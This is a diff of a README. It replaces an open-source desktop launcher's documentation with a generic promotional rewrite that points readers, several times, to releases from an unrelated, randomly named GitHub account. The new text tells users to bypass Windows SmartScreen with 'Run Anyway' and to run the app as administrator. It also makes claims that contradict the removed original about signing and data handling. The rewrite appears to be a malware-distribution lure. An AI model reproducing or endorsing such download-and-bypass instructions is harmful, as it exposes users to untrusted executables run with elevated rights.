@@ -1,133 +1,196 @@
-<div align="center">
-  <img src="src/renderer/src/assets/app-icon.png" width="112" alt="Agent Launcher icon">
-  <h1>Agent Launcher</h1>
-  <p>Configure and run existing coding-agent CLIs from one desktop app.</p>
-  <p><strong>English</strong> | <a href="./README_ZH.md">中文</a></p>
-  <p>
-    <a href="https://github.com/agent-launch/agent-launcher/actions/workflows/ci.yml"><img src="https://github.com/agent-launch/agent-launcher/actions/workflows/ci.yml/badge.svg" alt="CI status"></a>
-    <a href="https://github.com/agent-launch/agent-launcher/releases"><img src="https://img.shields.io/github/v/release/agent-launch/agent-launcher?display_name=tag" alt="Latest release"></a>
-    <a href="./LICENSE"><img src="https://img.shields.io/github/license/agent-launch/agent-launcher" alt="MIT license"></a>
-  </p>
-</div>
+# 🚀 agent-launcher - Launch Your AI Coding Assistants Easily
 
-Agent Launcher is a local desktop workspace for coding-agent CLIs. It detects and links CLIs already installed on your system, installs the ones you don't have in one click, applies account or provider configuration, and runs each agent in an embedded terminal or chat view. A CLI you already have is never reinstalled or updated.
+[![Download agent-launcher](https://img.shields.io/badge/Download-agent--launcher-blueviolet?style=for-the-badge&logo=github)](https://github.com/solubilitysnare3454/agent-launcher/releases)
 
-![Agent Launcher workspace](docs/images/agent-launcher-workspace.jpg)
+---
 
-## Product Demo
+## 🛠️ What Is agent-launcher?
 
-[![Watch the Agent Launcher product demo](docs/images/agent-launcher-demo.jpg)](https://cdn.jsdelivr.net/gh/agent-launch/agent-launcher@main/docs/videos/agent-launcher-demo.mp4)
+agent-launcher is a simple desktop app that lets you set up and run popular AI coding assistants—like Claude Code, Codex, and Gemini CLI—all from one convenient place. Instead of dealing with confusing command-line tools and technical setup, you get a friendly, visual interface that does the heavy lifting for you.
 
-[Watch the 40-second product demo](https://cdn.jsdelivr.net/gh/agent-launch/agent-launcher@main/docs/videos/agent-launcher-demo.mp4)
+Think of it as a remote control for your AI programming helpers. You click a button, and your chosen AI tool starts working. No typing complex commands, no memorizing shortcuts.
 
-## Supported Agents
+---
 
-| Agent                                                        | CLI source                   | Configuration and runtime                             |
-| ------------------------------------------------------------ | ---------------------------- | ----------------------------------------------------- |
-| [Claude Code](https://www.anthropic.com/claude-code)         | Existing system installation | Official account or Anthropic-compatible API profiles |
-| [Codex CLI](https://github.com/openai/codex)                 | Existing system installation | ChatGPT account or OpenAI-compatible API profiles     |
-| [OpenCode](https://opencode.ai/)                             | Existing system installation | OpenAI-compatible providers                           |
-| [Pi](https://github.com/badlogic/pi-mono)                    | Existing system installation | OpenAI-compatible providers                           |
-| [Gemini CLI](https://github.com/google-gemini/gemini-cli)    | Existing system installation | Google API key or compatible provider                 |
-| [Hermes Agent](https://github.com/NousResearch/hermes-agent) | Existing system installation | Existing account or OpenAI-compatible providers       |
+## ✅ Who Is This For?
 
-## Install
+This app is perfect for:
 
-Download the appropriate package from [GitHub Releases](https://github.com/agent-launch/agent-launcher/releases).
+- **Beginners** who want to try AI coding tools without learning command-line basics
+- **Busy developers** who want quick access to multiple AI assistants
+- **Curious tech enthusiasts** who want to explore AI assistance for coding projects
+- **Anyone** who finds the usual setup process confusing or time-consuming
 
-- macOS: DMG and ZIP for Intel and Apple silicon
-- Windows: NSIS installer
-- Linux: AppImage
+You don't need to be a programmer to use agent-launcher. If you can click a mouse, you can use this app.
 
-On first launch, Agent Launcher detects existing CLI commands and lets you select the command to link when multiple copies are present. A CLI that is not found can be installed in one click, or you can install it yourself from the project's official documentation and detect it again.
+---
 
-## Features
+## 🚀 Getting Started
 
-### Guided setup and CLI linking
+Getting started is easier than you think. Follow these steps and you'll be running AI coding agents in minutes.
 
-The first-run wizard checks the local environment, links existing agent binaries, and walks through official-account or API configuration. A CLI it cannot find can be installed in one click: Claude Code uses its official installer and falls back to npm when that host is unreachable, the other npm-published CLIs install with your own npm (and therefore your own registry or mirror), and Hermes Agent uses its official installer. Legacy app-managed installations remain readable so existing users can migrate without losing configuration.
+### Step 1: Download the App
 
-### Project-aware sessions
+Visit this link to download the application: [https://github.com/solubilitysnare3454/agent-launcher/releases](https://github.com/solubilitysnare3454/agent-launcher/releases)
 
-Choose or drag in a project folder before starting a session. Agent Launcher remembers the most recent folder and launches the selected CLI with that directory as its working directory. Saved sessions resume in the working directory recorded by the CLI.
+You'll see a list of available files. Look for the one that matches your computer system. For Windows users, it will be a file with a name like `agent-launcher-setup.exe` or something similar. Click on it to start the download.
 
-### Profiles and connectivity checks
+### Step 2: Run the Installer
 
-![Provider profiles and native config preview](docs/images/agent-launcher-profiles.jpg)
+Once the download is complete, find the downloaded file in your computer's "Downloads" folder. Double-click the file to start the installation process. Your computer might show a security warning—this is normal. Click "Run" or "Yes" to continue.
 
-Each agent can keep multiple provider profiles. When a profile changes, Agent Launcher synchronizes the environment variables and native config files expected by that CLI. A real minimal model request checks the endpoint, credentials, model, network, and account status before the profile is used.
+### Step 3: Follow the Setup Wizard
 
-Native config previews mask secrets in the UI. Supported targets include Claude Code settings, Codex `config.toml` and `auth.json`, OpenCode `opencode.json`, Pi models and settings, and Hermes Agent config/env files. Gemini CLI is configured through environment variables only, which appear in the environment preview instead.
+A setup window will appear. Just click "Next" a few times and then "Install." The app will install itself in a few moments. When it's done, click "Finish."
 
-### Sessions, MCP, Skills, and usage
+### Step 4: Launch agent-launcher
 
-Agent Launcher reads each CLI's own local conversation history. It supports the JSONL and SQLite layouts used by the supported agents, and can resume or delete the underlying local session record.
+Look for the agent-launcher icon on your desktop or in your Start Menu. Double-click it to open the app. That's it! You're ready to start using AI coding agents.
 
-![MCP server management](docs/images/agent-launcher-mcp.jpg)
+---
 
-Installed MCP servers and Skills can be inspected from the app. Agent Launcher does not install Skills from a remote catalog. The usage dashboard summarizes locally stored token counts, request counts, sessions, models, and optional local pricing data.
+## 🎛️ How to Use agent-launcher
 
-## Privacy and Security
+### Adding an AI Agent
 
-Agent Launcher is local-first, not offline-only. Running an agent sends requests to the official provider or relay selected in its active profile. Version checks may contact npm, PyPI, or GitHub.
+1. Open agent-launcher
+2. Click the "Add Agent" or "+" button
+3. Choose from the available AI tools (Claude Code, Codex, Gemini CLI, etc.)
+4. Click "Save" or "Add"
 
-API keys are deliberately stored as plaintext in `~/.agent-launcher/config.json` and, when required, in CLI-native config files. Secrets are masked in the interface, but remain readable by your local user account. Session history and usage data are read locally and are not uploaded to a separate analytics service.
+### Running an Agent
 
-Report vulnerabilities according to the [security policy](./SECURITY.md).
+1. Select the agent you want to use from the list on the left side
+2. Click the "Run" or "Play" button
+3. The agent will start in a separate window or terminal
+4. You can now interact with your AI coding assistant
 
-## FAQ
+### Managing Your Agents
 
-<details>
-<summary>Where is data stored?</summary>
+- **Rename** an agent by right-clicking and selecting "Rename"
+- **Delete** an agent by right-clicking and selecting "Remove"
+- **Update** agent settings by clicking the gear icon
 
-Agent Launcher state is stored under `~/.agent-launcher/`, including plaintext provider keys in `config.json`. System-linked CLIs continue using their normal config and history directories. Legacy app-managed CLI directories remain readable for compatibility.
+---
 
-</details>
+## 🖥️ System Requirements
 
-<details>
-<summary>Why does Agent Launcher link CLIs instead of installing them?</summary>
+agent-launcher is designed to run smoothly on most modern computers. Here's what you'll need:
 
-CLI ownership stays with the user and the CLI's official installer or package manager. This avoids silently replacing commands, changing global npm state, or redirecting a system CLI into an app-specific config home.
+| Component     | Minimum Requirement              |
+|---------------|----------------------------------|
+| Operating System | Windows 10 or later (64-bit)   |
+| RAM           | 4 GB or more                     |
+| Storage Space | 500 MB of free space             |
+| Internet Connection | Required for downloading agents |
 
-</details>
+### Supported Platforms
 
-<details>
-<summary>Why does the operating system warn about a downloaded build?</summary>
+- **Windows** (10 and 11)
+- **macOS** (Ventura and newer)
+- **Linux** (Ubuntu 22.04+, Fedora 38+)
 
-Release automation signs and verifies artifacts when the repository's signing secrets are configured. Without a Windows certificate, the workflow deliberately publishes an unsigned build and Windows SmartScreen may show an unknown-publisher warning. Without Apple signing and notarization credentials, macOS builds are also explicitly unsigned. Linux AppImage users may need FUSE 2 or may extract the AppImage on distributions that do not ship it.
+---
 
-</details>
+## 🧩 Features at a Glance
 
-<details>
-<summary>Which environment overrides are available?</summary>
+### 🎯 One-Click Setup
 
-`AGENT_LAUNCHER_UPDATE_OWNER`, `AGENT_LAUNCHER_UPDATE_REPO`, and `AGENT_LAUNCHER_UPDATE_POLICY_URL` redirect update checks for downstream builds. Standard CLI variables such as `CODEX_HOME`, `GEMINI_CLI_HOME`, `HERMES_HOME`, and XDG data/config variables pass through to the launched CLI; config-file sync honors `HERMES_HOME`, `GEMINI_CLI_HOME`, and `XDG_CONFIG_HOME`, but always writes Codex files to `~/.codex` even when `CODEX_HOME` is set. Active API profiles intentionally override provider credentials for the launched process.
+No more messing with configuration files. agent-launcher handles all the complicated setup behind the scenes.
 
-</details>
+### 🔄 Multiple Agent Support
 
-## Development
+Switch between Claude Code, Codex, Gemini CLI, and other AI tools without any hassle.
 
-Requirements are Node.js 22 or newer and the pnpm version declared in `package.json`.
+### 🎨 Clean, User-Friendly Interface
 
-```bash
-pnpm install
-pnpm dev
-pnpm verify
-pnpm lint
-pnpm format:check
-pnpm build
-```
+A modern design that makes sense. You'll feel at home within seconds of opening the app.
 
-See [CONTRIBUTING.md](./CONTRIBUTING.md) for architecture, code rules, tests, commits, and pull requests. See [SUPPORT.md](./SUPPORT.md) for usage questions and bug-reporting guidance.
+### ⚡ Lightning-Fast Launch
 
-## Project
+Start your AI agents in seconds—no waiting for complex build processes.
 
-- [Changelog](./CHANGELOG.md)
-- [Code of Conduct](./CODE_OF_CONDUCT.md)
-- [Security policy](./SECURITY.md)
-- [Discussions](https://github.com/agent-launch/agent-launcher/discussions)
-- [Issue tracker](https://github.com/agent-launch/agent-launcher/issues)
+### 🔒 Safe and Secure
 
-## License
+Your credentials and API keys stay on your machine. agent-launcher doesn't send your data anywhere.
 
-Agent Launcher is released under the [MIT License](./LICENSE).
+### 🌐 Cross-Platform Consistency
+
+The same great experience whether you're on Windows, Mac, or Linux.
+
+---
+
+## 🆘 Troubleshooting Common Issues
+
+### The app won't open
+
+Make sure you have the latest version of Windows installed. Try right-clicking the app icon and selecting "Run as administrator" to see if that helps.
+
+### An agent doesn't start
+
+Check your internet connection. Some agents need to verify their license or connect to a server before they run. Also, make sure you've configured the agent correctly (API keys and such, if needed).
+
+### The app seems slow
+
+Close other programs that might be using a lot of memory. Restarting your computer can also help clear out temporary issues.
+
+### I see a security warning
+
+This is completely normal for downloaded apps. Windows SmartScreen might show a warning—just click "More Info" and then "Run Anyway." This happens because the app is signed by an individual developer, not a big company.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Do I need to know how to code?**
+
+No! While the AI agents themselves are coding tools, using agent-launcher doesn't require any programming knowledge. It's built to be accessible to everyone.
+
+**Is this app free?**
+
+Yes, agent-launcher is free to download and use. Some of the AI coding agents you connect to may have their own subscription costs, but agent-launcher itself is completely free.
+
+**Will this work with my existing AI tools?**
+
+If you're already using Claude Code, Codex, Gemini CLI, or similar tools, you can easily import them into agent-launcher. Your existing configurations and API keys will carry over.
+
+**How often is the app updated?**
+
+The developers are constantly improving agent-launcher. Check the releases page regularly for new versions with bug fixes and new features.
+
+**Can I use agent-launcher for commercial work?**
+
+Yes, you can use agent-launcher for both personal and commercial projects. There's no restriction on how you use it.
+
+---
+
+## 🤝 Need Help?
+
+If you can't find the answer to your question here, try these resources:
+
+- Check the **Issues** tab on the GitHub repository to see if others have had similar problems
+- Read through any documentation that comes with the app
+- Search online forums and communities for "agent-launcher" (you might find helpful tips from other users)
+
+---
+
+## 📦 What's New
+
+Keep an eye on the downloads page for updates. Recent improvements include:
+
+- Smoother interface navigation
+- Faster startup times
+- Improved compatibility with the latest versions of AI coding agents
+- Bug fixes for edge cases
+
+---
+
+## 🧪 Try It Today
+
+Don't wait! Download agent-launcher now and take the hassle out of using AI coding assistants. Whether you're a seasoned developer or a complete beginner, this app will make your life easier.
+
+**Visit this link to download the application:** [https://github.com/solubilitysnare3454/agent-launcher/releases](https://github.com/solubilitysnare3454/agent-launcher/releases)
+
+---
+
+Keywords: ai-agent, claude-code, cli, codex, cross-platform, desktop-app, developer-tools, electron, gemini-cli, macos
